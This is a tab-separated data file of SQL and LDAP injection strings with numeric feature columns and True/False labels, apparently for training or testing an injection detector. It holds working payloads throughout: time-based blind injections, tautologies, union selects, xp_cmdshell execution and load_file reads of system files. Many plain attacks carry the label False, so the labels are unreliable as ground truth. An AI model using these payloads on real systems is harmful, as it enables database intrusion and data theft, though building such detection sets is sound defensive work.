sleep(__time__)#	1	2	2	0	0	16	False
1 or sleep(__time__)#	1	3	2	0	2	21	False
" or sleep(__time__)#	1	3	2	0	2	21	False
' or sleep(__time__)#	2	3	2	0	2	21	False
" or sleep(__time__)="	2	3	2	0	2	22	False
' or sleep(__time__)='	3	3	2	0	2	22	False
1) or sleep(__time__)#	1	3	3	0	2	22	False
") or sleep(__time__)="	2	3	3	0	2	23	False
') or sleep(__time__)='	3	3	3	0	2	23	False
1)) or sleep(__time__)#	1	3	4	0	2	23	False
")) or sleep(__time__)="	2	3	4	0	2	24	False
')) or sleep(__time__)='	3	3	4	0	2	24	False
;waitfor delay '0:0:__time__'--	3	3	3	0	2	31	False
);waitfor delay '0:0:__time__'--	3	3	4	0	2	32	False
';waitfor delay '0:0:__time__'--	4	3	3	0	2	32	False
";waitfor delay '0:0:__time__'--	3	3	3	0	2	32	False
');waitfor delay '0:0:__time__'--	4	3	4	0	2	33	False
");waitfor delay '0:0:__time__'--	3	3	4	0	2	33	False
));waitfor delay '0:0:__time__'--	3	3	5	0	2	33	False
'));waitfor delay '0:0:__time__'--	4	3	5	0	2	34	False
"));waitfor delay '0:0:__time__'--	3	3	5	0	2	34	False
benchmark(10000000,md5(1))#	1	1	5	1	0	27	False
1 or benchmark(10000000,md5(1))#	1	2	5	1	2	32	False
" or benchmark(10000000,md5(1))#	1	2	5	1	2	32	False
' or benchmark(10000000,md5(1))#	2	2	5	1	2	32	False
1) or benchmark(10000000,md5(1))#	1	2	6	1	2	33	False
") or benchmark(10000000,md5(1))#	1	2	6	1	2	33	False
') or benchmark(10000000,md5(1))#	2	2	6	1	2	33	False
1)) or benchmark(10000000,md5(1))#	1	2	7	1	2	34	False
")) or benchmark(10000000,md5(1))#	1	2	7	1	2	34	False
')) or benchmark(10000000,md5(1))#	2	2	7	1	2	34	False
pg_sleep(__time__)--	1	2	2	0	0	20	False
1 or pg_sleep(__time__)--	1	3	2	0	2	25	False
" or pg_sleep(__time__)--	1	3	2	0	2	25	False
' or pg_sleep(__time__)--	2	3	2	0	2	25	False
1) or pg_sleep(__time__)--	1	3	3	0	2	26	False
") or pg_sleep(__time__)--	1	3	3	0	2	26	False
') or pg_sleep(__time__)--	2	3	3	0	2	26	False
1)) or pg_sleep(__time__)--	1	3	4	0	2	27	False
")) or pg_sleep(__time__)--	1	3	4	0	2	27	False
')) or pg_sleep(__time__)--	2	3	4	0	2	27	False
)%20or%20('x'='x	4	1	5	0	0	16	True
%20or%201=1	1	1	2	0	0	11	True
; execute immediate 'sel' || 'ect us' || 'er'	8	1	4	0	8	45	False
benchmark(10000000,md5(1))#	1	1	5	1	0	27	False
update	0	1	0	0	0	6	False
";waitfor delay '0:0:__time__'--	3	3	3	0	2	32	False
1) or pg_sleep(__time__)--	1	3	3	0	2	26	False
||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1	4	16	0	0	43	False
"hi"") or (""a""=""a"	10	1	2	0	2	21	True
delete	0	1	0	0	0	6	False
like	0	0	0	1	0	4	False
" or sleep(__time__)#	1	3	2	0	2	21	False
pg_sleep(__time__)--	1	2	2	0	0	20	False
*(|(objectclass=*))	1	0	6	0	0	19	False
declare @q nvarchar (200) 0x730065006c00650063 ...	0	1	6	1	5	50	False
 or 0=0 #	2	1	0	0	3	9	True
insert	0	1	0	0	0	6	False
1) or sleep(__time__)#	1	3	3	0	2	22	False
) or ('a'='a	4	1	3	0	2	12	True
; exec xp_regread	0	2	1	0	2	17	False
*|	0	0	0	0	0	2	False
@var select @var as var into temp end --	1	4	2	2	8	40	False
1)) or benchmark(10000000,md5(1))#	1	2	7	1	2	34	False
asc	0	1	0	0	0	3	False
(||6)	0	0	2	0	0	5	False
"a"" or 3=3--"	5	1	0	0	2	14	True
" or benchmark(10000000,md5(1))#	1	2	5	1	2	32	False
# from wapiti	1	0	0	1	2	13	False
 or 0=0 --	2	1	0	0	3	10	True
1 waitfor delay '0:0:10'--	3	2	1	0	3	26	False
 or 'a'='a	4	1	1	0	2	10	True
hi or 1=1 --"	3	1	0	0	3	13	True
or a = a	1	1	0	0	3	8	True
 union all select	0	2	0	1	3	17	False
) or sleep(__time__)='	2	3	3	0	2	22	False
)) or benchmark(10000000,md5(1))#	1	2	7	1	2	33	False
hi' or 'a'='a	5	1	1	0	2	13	True
0	0	0	0	0	0	1	False
21 %	0	0	1	0	1	4	False
limit	0	1	0	0	0	5	False
 or 1=1	1	1	0	0	2	7	True
 or 2 > 1	0	1	1	0	4	9	False
")) or benchmark(10000000,md5(1))#	1	2	7	1	2	34	False
print	0	1	0	0	0	5	False
hi') or ('a'='a	5	1	3	0	2	15	True
 or 3=3	1	1	0	0	2	7	True
));waitfor delay '0:0:__time__'--	3	3	5	0	2	33	False
a' waitfor delay '0:0:10'--	4	2	1	0	3	27	False
1;(load_file(char(47,101,116,99,47,112,97,115, ...	0	2	8	0	1	50	False
or%201=1	1	1	1	0	0	8	True
1 or sleep(__time__)#	1	3	2	0	2	21	False
or 1=1	1	1	0	0	1	6	True
 and 1 in (select var from temp)--	1	3	2	2	7	34	False
 or '7659'='7659	4	1	1	0	2	16	True
 or 'text' = n'text'	5	1	1	0	4	20	True
 --	1	0	0	0	1	3	False
 or 1=1 or ''='	5	2	1	0	4	15	True
declare @s varchar (200) select @s = 0x73656c6 ...	1	2	7	1	8	50	True
exec xp	0	1	0	0	1	7	False
; exec master..xp_cmdshell 'ping 172.10.1.255'--	3	2	7	0	4	48	False
3.10e+17	0	0	2	0	0	8	False
" or pg_sleep(__time__)--	1	3	2	0	2	25	False
x' and email is null; --	2	2	1	1	5	24	False
&	0	0	1	0	0	1	False
admin' or '	2	1	1	0	2	11	False
 or 'unusual' = 'unusual'	5	1	2	0	4	25	True
//	0	0	0	0	0	2	False
truncate	0	0	0	1	0	8	False
1) or benchmark(10000000,md5(1))#	1	2	6	1	2	33	False
\x27union select	0	1	0	0	1	16	False
declare @s varchar(200) select @s = 0x77616974 ...	1	2	7	1	7	50	True
tz_offset	0	0	0	0	0	9	False
sqlvuln	0	0	0	0	0	7	False
"));waitfor delay '0:0:__time__'--	3	3	5	0	2	34	False
||6	0	0	0	0	0	3	False
or%201=1 --	2	1	1	0	1	11	True
%2a%28%7c%28objectclass%3d%2a%29%29	0	0	8	0	0	35	False
or a=a	1	1	0	0	1	6	True
) union select * from information_schema.tables;	0	3	4	1	5	48	False
print @@variable	0	2	2	0	1	16	False
or isnull(1/0) /*	1	2	2	0	2	17	False
26 %	0	0	1	0	1	4	False
" or "a"="a	4	1	0	0	2	11	True
(sqlvuln)	0	0	2	0	0	9	False
x' and members.email is null; --	2	2	2	1	5	32	False
 or 1=1--	2	1	0	0	2	9	True
 and 1=( if((load_file(char(110,46,101,120,11 ...	1	3	8	0	4	49	False
